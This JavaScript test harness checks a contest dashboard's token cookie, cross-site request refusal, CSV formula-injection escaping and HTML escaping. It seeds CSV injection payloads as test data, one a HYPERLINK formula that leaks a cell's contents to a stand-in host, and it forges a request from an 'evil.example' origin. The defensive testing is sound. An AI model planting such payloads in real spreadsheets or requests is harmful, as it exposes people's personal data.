// THE DASHBOARD'S DOOR, AND WHAT IT HANDS OUT.
//
// Same method as workerguards.mjs: the REAL dashboard module against the REAL
// schema (node:sqlite behind a D1-shaped adapter), its `fetch` called directly.
// What it grades:
//   - the token is accepted from ?k= (old links), an Authorization: Bearer
//     header, or the HttpOnly cookie the share link sets — and nothing else;
//   - opening the share link trades ?k= for the cookie and reloads at a clean
//     URL, and the page it serves never carries the token;
//   - the two writes refuse a request another site started;
//   - the CSV cannot run a formula an entrant typed into a name or email;
//   - the page-side esc() is safe inside attribute values.
//
//   node tools/harness/dashguards.mjs
import { DatabaseSync } from 'node:sqlite';
import fs from 'node:fs';

const checks = [];
const check = (w, ok, d = '') => {
  checks.push([w, ok]);
  console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${w}${d ? '   ' + d : ''}`);
};

const db = new DatabaseSync(':memory:');
db.exec(fs.readFileSync('cloudflare/schema.sql', 'utf8'));
const DB = {
  prepare(sql) {
    const st = db.prepare(sql);
    const wrap = (args) => ({
      run: async () => ({ success: true, ...st.run(...args) }),
      first: async () => st.get(...args) ?? null,
      all: async () => ({ results: st.all(...args) }),
    });
    return { bind: (...args) => wrap(args), ...wrap([]) };
  },
};

const mod = await import('../../cloudflare/dashboard-worker.js');
const worker = mod.default;
const TOKEN = 'a'.repeat(16) + 'harness-token-0123456789';
const HOST = 'https://dash.test';
const call = async (path, init = {}, env = { DB, DASH_TOKEN: TOKEN }) => {
  const res = await worker.fetch(new Request(HOST + path, { redirect: 'manual', ...init }), env);
  return { status: res.status, headers: res.headers, text: await res.text() };
};

// ── who gets in ───────────────────────────────────────────────────────────
check('no token is a 404', (await call('/')).status === 404);
check('a wrong token is a 404', (await call('/?k=nope')).status === 404);
check('a wrong Bearer is a 404', (await call('/data', { headers: { Authorization: 'Bearer nope' } })).status === 404);

const link = await call('/?k=' + TOKEN);
const setCookie = link.headers.get('Set-Cookie') || '';
const cookie = setCookie.split(';')[0];
check('opening the share link answers 200 with a cookie', link.status === 200 && cookie.startsWith('wh_dash='), setCookie);
check('the cookie is HttpOnly; Secure; SameSite=Strict; Path=/',
  /HttpOnly/.test(setCookie) && /Secure/.test(setCookie) && /SameSite=Strict/.test(setCookie) && /Path=\//.test(setCookie));
check('the cookie is not the token itself', !setCookie.includes(TOKEN));
check('and the page reloads at a clean / (no ?k= left in the address bar)',
  /http-equiv="refresh" content="0;url=\/"/.test(link.text) && !link.text.includes(TOKEN));
check('with the no-referrer / noindex headers on the hop too',
  link.headers.get('Referrer-Policy') === 'no-referrer' && /noindex/.test(link.headers.get('X-Robots-Tag') || ''));

const page = await call('/', { headers: { Cookie: 'other=1; ' + cookie } });
check('the cookie opens the dashboard page', page.status === 200 && /Contest Console/.test(page.text), String(page.status));
check('the page carries no token and builds no ?k= URLs',
  !page.text.includes(TOKEN) && !/[?&]k=/.test(page.text.replace(/\/\?k=<DASH_TOKEN>/g, '')));
check('the page fetches /data, /toggle, /push-toggle and /csv without the token',
  /fetch\('\/data'\)/.test(page.text) && /fetch\('\/toggle'/.test(page.text)
  && /fetch\('\/push-toggle'/.test(page.text) && /location\.href = '\/csv'/.test(page.text));

const viaCookie = await call('/data', { headers: { Cookie: cookie } });
check('/data works with the cookie', viaCookie.status === 200 && JSON.parse(viaCookie.text).ok === true);
const viaBearer = await call('/data', { headers: { Authorization: 'Bearer ' + TOKEN } });
check('/data works with Authorization: Bearer', viaBearer.status === 200);
const viaK = await call('/data?k=' + TOKEN);
check('/data?k= still works for old tabs and links', viaK.status === 200);

const rotated = await call('/data', { headers: { Cookie: cookie } }, { DB, DASH_TOKEN: 'rotated-' + TOKEN });
check('rotating DASH_TOKEN kills every cookie', rotated.status === 404);
const noSecret = await call('/data', { headers: { Cookie: cookie } }, { DB });
check('no DASH_TOKEN configured lets nobody in', noSecret.status === 404);

// ── the writes ────────────────────────────────────────────────────────────
db.exec('UPDATE contest_state SET open = 1;');
const forged = await call('/toggle', { method: 'POST', headers: { Cookie: cookie, Origin: 'https://evil.example' } });
check('POST /toggle started by another site is refused', forged.status === 404, String(forged.status));
check('and the switch did not move', db.prepare('SELECT open FROM contest_state WHERE id = 1').get().open === 1);
const flip = await call('/toggle', { method: 'POST', headers: { Cookie: cookie, Origin: HOST } });
check('POST /toggle from the page itself works with the cookie', flip.status === 200 && JSON.parse(flip.text).open === false);
const push = await call('/push-toggle', { method: 'POST', headers: { Cookie: cookie, Origin: HOST } });
check('POST /push-toggle works with the cookie', push.status === 200);
db.exec('UPDATE contest_state SET open = 1;');

// ── the CSV ──────────────────────────────────────────────────────────────
const now = Date.now();
const evil = [
  ['e1', '=HYPERLINK("http://x.example/?"&C3,"win")', '4045550101', '=1+1@x.co'],
  ['e2', '+SUM(1)', '4045550102', '-2+3@x.co'],
  ['e3', '@cmd', '4045550103', '\tx@x.co'],
  ['e4', 'Plain "Quoted" Name', '4045550104', 'ok@example.com'],
];
for (const [id, name, phone, email] of evil) {
  db.prepare('INSERT INTO runs (id, name, score, updated, created, plays) VALUES (?, ?, ?, ?, ?, 1)').run(id, name, 100, now, now);
  db.prepare('INSERT INTO entrants (id, phone, email, name, created, seen) VALUES (?, ?, ?, ?, ?, ?)').run(id, phone, email, name, now, now);
}
const csv = await call('/csv', { headers: { Cookie: cookie } });
const cells = csv.text.split('\n').slice(1).flatMap((line) => line.match(/"(?:[^"]|"")*"/g) || []);
const leading = cells.map((c) => c.slice(1, 2));
check('the CSV downloads with the cookie', csv.status === 200 && /text\/csv/.test(csv.headers.get('Content-Type') || ''));
check('no quoted CSV cell starts with = + - @ tab or CR',
  leading.every((ch) => !/[=+\-@\t\r]/.test(ch)), leading.join(''));
check("formula-looking values are kept, behind a '",
  csv.text.includes(`"'=HYPERLINK(""http://x.example/?""&C3,""win"")"`) && csv.text.includes(`"'-2+3@x.co"`), '');
check('ordinary values are untouched', csv.text.includes('"Plain ""Quoted"" Name"') && csv.text.includes('"ok@example.com"'));
check('csvCell is the exported helper the route uses',
  typeof mod.csvCell === 'function' && mod.csvCell('=1') === `"'=1"` && mod.csvCell('a"b') === '"a""b"');

// ── the page's esc() inside attribute values ─────────────────────────────
const escSrc = (page.text.match(/const esc = \(s\) => [^\n]+;/) || [])[0];
// eslint-disable-next-line no-new-func
const pageEsc = escSrc && new Function(escSrc + '; return esc;')();
check('the page esc() escapes " and \'', !!pageEsc && pageEsc(`"' <a>&`) === '&quot;&#39; &lt;a&gt;&amp;', escSrc ? pageEsc(`"' <a>&`) : 'not found');

const bad = checks.filter(([, ok]) => !ok);
console.log(bad.length ? `\nFAILED: ${bad.length} of ${checks.length}` : `\nALL ${checks.length} PASS`);
process.exit(bad.length ? 1 : 0);
